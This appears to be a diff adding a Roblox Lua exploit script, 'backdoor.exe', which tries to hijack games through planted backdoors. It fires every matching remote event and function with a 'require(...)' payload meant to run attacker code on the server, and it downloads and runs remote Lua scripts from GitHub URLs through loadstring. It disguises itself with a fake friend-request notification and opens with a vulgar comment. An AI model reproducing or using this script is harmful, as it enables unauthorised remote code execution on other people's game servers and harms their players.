@@ -1,0 +1,151 @@
+--[[
+ backdor exe edit real big brain small penis nu ts
+]]
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local requireScript = ("require(6459583396).main('%s')"):format(LocalPlayer.Name)
+local invCode = "AAAA 394392293GGKGFGFJ4R44RMMMM"
+
+local alternativeSS = {
+	run = { [1] = "5#lGIERKWEF" },
+	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
+	helpme = { [1] = "helpme" },
+	pickett = { [1] = "cGlja2V0dA==" },
+	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/harkedSS.lua",
+        suspression = "https://raw.githubusercontent.com/mininoobiksl/backdoor/main/hark.lua",
+        suspression2 = "https://raw.githubusercontent.com/mininoobiksl/backdoor.exe-with-suspression-text-delete-remote/main/harke.lua",
+        delete = "https://raw.githubusercontent.com/mininoobiksl/backdoor.exe-with-suspression-text-delete-remote/main/harkepro.lua"
+}
+
+local function notify(text)
+	game:GetService("StarterGui"):SetCore(
+	"SendNotification",
+		{
+			Title = "DOEOOT3 Sent you a friend request",
+			Duration = 3,
+			Text = text
+		}
+	)
+end
+
+local function attached(possibleWait)
+	if possibleWait then wait(possibleWait) end
+	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
+end
+
+local function validRemote(rm, _className)
+	local fullName =  rm:GetFullName()
+	
+	if string.find(fullName, "DefaultChat") then return false end
+	if string.find(fullName, LocalPlayer.Name) then return false end
+	if rm:FindFirstChild("__FUNCTION") then return false end
+	if rm.Parent == game:GetService("JointsService") then return false end
+	
+	if rm.ClassName ~= _className then return false end
+
+	if getgenv().blacklisted then
+		if table.find(getgenv().blacklisted, fullName) then return false end
+	end
+
+	return true
+end
+
+local function harked()
+	local backpack = LocalPlayer.Backpack 
+	return backpack:FindFirstChild("HandlessSegway") and
+		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+end
+
+local function suspression()
+	local sus = game.ReplicatedStorage
+	return sus:FindFirstChild("Delete\208\161ar1")
+end
+
+local function suspression2()
+	local sus2 = game.ReplicatedStorage
+	return sus2:FindFirstChild("DeleteCar")
+end
+
+local function delete()
+	local del = game.ReplicatedStorage
+	return del:FindFirstChild("Delete")
+end
+
+local function emmaBackdoor(rm)
+	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
+end
+local function runBackdoor(rm)
+	return rm.Name == "Run" and
+	rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
+	rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
+end
+
+local function scanGame()
+    notify("scan")
+	if harked() then
+		loadstring(game:HttpGetAsync(alternativeSS.harked))()
+		return
+	end
+
+	if suspression() then
+		loadstring(game:HttpGetAsync(alternativeSS.suspression))()
+		return
+	end
+
+	if suspression2() then
+		loadstring(game:HttpGetAsync(alternativeSS.suspression2))()
+		return
+	end
+
+	if delete() then
+		loadstring(game:HttpGetAsync(alternativeSS.delete))()
+		return
+	end
+
+	for _, remote in pairs(game:GetDescendants()) do
+		if validRemote(remote, "RemoteEvent") and not attached() then
+			if emmaBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.emma), requireScript)
+			end
+			if runBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.run), requireScript)
+			end
+
+			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
+			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
+			remote:FireServer(requireScript)
+
+		end
+	end
+
+	for _, remote in pairs(game:GetDescendants()) do
+		if validRemote(remote, "RemoteFunction") and not attached() then
+			remote:InvokeServer(requireScript)
+		end
+	end
+
+end
+
+local function Main()
+	notify("w2e\nCode: "..invCode)
+
+	scanGame()
+	
+	if not attached(2) then
+		notify("error.\nerror?")
+	end
+end
+
+if game:IsLoaded() then
+	pcall(Main)
+end
+
+--	k4scripts
+--	.------.
+--	|4.--. |
+--	| :│/: |
+--	| :│\: |
+--	| '--'4|
+--	`------'
+print("sent report to roblox enhoy ban")
